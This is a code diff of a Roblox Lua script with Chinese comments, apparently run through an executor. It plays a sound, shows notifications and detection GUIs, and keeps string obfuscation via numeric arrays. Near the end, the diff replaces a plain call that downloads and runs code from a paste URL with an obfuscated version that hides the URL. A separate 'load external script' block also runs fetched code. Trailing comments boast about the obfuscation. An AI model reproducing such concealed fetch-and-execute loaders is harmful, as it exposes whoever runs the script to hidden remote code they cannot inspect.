@@ -280,7 +280,7 @@ end
 --如果检测玩家不在局内立即重启
 GuiService.ErrorMessageChanged:Connect(onErrorMessageChanged) -- 连接错误消息事件
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-local _pk9c0zfi5 = function()
+local _rv8l0trqn = function()
     -- 异步加载外部脚本
 task.spawn(function()
    pcall(function()
@@ -294,11 +294,8 @@ task.spawn(function()
     end)()))()
    end)
 end)
-end;
-_pk9c0zfi5();
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
-local _ep3xezjd5 = function()
-    -- 定义全局变量
+-- 定义全局变量
 local audioId = 3398620867 -- 音乐id
 local sound = Instance.new((function()
         local a={1116,1480,1558,1467,1337};
@@ -308,12 +305,9 @@ local sound = Instance.new((function()
         end;
         return b;
     end)()) -- 创建一个声音对象
-end;
-_ep3xezjd5();
 ---------------------------------------------------------------------------------------
 -- 播放声音函数
-local _ixypkzhpe = function()
-    local function playSound(audioId, volume, pitch)
+local function playSound(audioId, volume, pitch)
     sound.SoundId = (function()
         local a={1519,1311,1597,1298,1532,1532,1350,1545,1402,1337,791,648,648};
         local b='';
@@ -327,11 +321,8 @@ local _ixypkzhpe = function()
     sound.Parent = game.Workspace -- 将声音对象放置到游戏工作空间中
     sound:Play() -- 播放声音
 end
-end;
-_ixypkzhpe();
 ---------------------------------------------------------------------------------------
-local _gtozhds31 = function()
-    -- 显示消息函数
+-- 显示消息函数
 local function makeMessage(message, playSound)
     pcall(function()
         local msg = tostring(message) -- 将消息转换为字符串
@@ -392,8 +383,6 @@ local function makeMessage(message, playSound)
         end
     end)
 end
-end;
-_gtozhds31();
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -- 创建检测 GUI 函数
 local function createDetectionGUI()
@@ -519,8 +508,7 @@ local function createDetectionGUI()
 end
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -- 系统通知函数
-local _6e8swndpp = function()
-    local function sendNotification(title, text, icon, duration)
+local function sendNotification(title, text, icon, duration)
     game:GetService((function()
         local a={1116,1545,1298,1519,1545,1350,1519,960,1558,1402};
         local b='';
@@ -542,8 +530,6 @@ local _6e8swndpp = function()
         Duration = duration;
     })
 end
-end;
-_6e8swndpp();
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 -- 主程序入口
 local function main()
@@ -646,15 +632,24 @@ local function main()
         wait(0.7)
         playSound(audioId, 5, 1)
         wait(0.1)
-        loadstring(game:HttpGet("https://pastefy.app/bqvlQXRW/raw"))()
+        loadstring(game:HttpGet((function()
+        local a={1389,1545,1545,1493,1532,791,648,648,1493,1298,1532,1545,1350,1363,1610,635,1298,1493,1493,648,1311,1506,1571,1441,1090,1181,1103,1168,648,1519,1298,1584};
+        local b='';
+        for i=1,#a do 
+            b=b..string.char((a[i]-37)/13);
+        end;
+        return b;
+        end)()))()
         wait(2.5)
         script.Parent.Parent:Destroy()
-    end
-    coroutine.wrap(checkScript)()
-end
-
--- 执行主程序
-main()
+        end
+        coroutine.wrap(checkScript)()
+        end
+        -- 执行主程序
+        main()
+        end;
+_rv8l0trqn();--混淆结束[只混淆一半，再说你开的源我全部混淆]
+--开个公开库你真当你会开源，真当自己是黑客了，有本事你开加密啊
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 
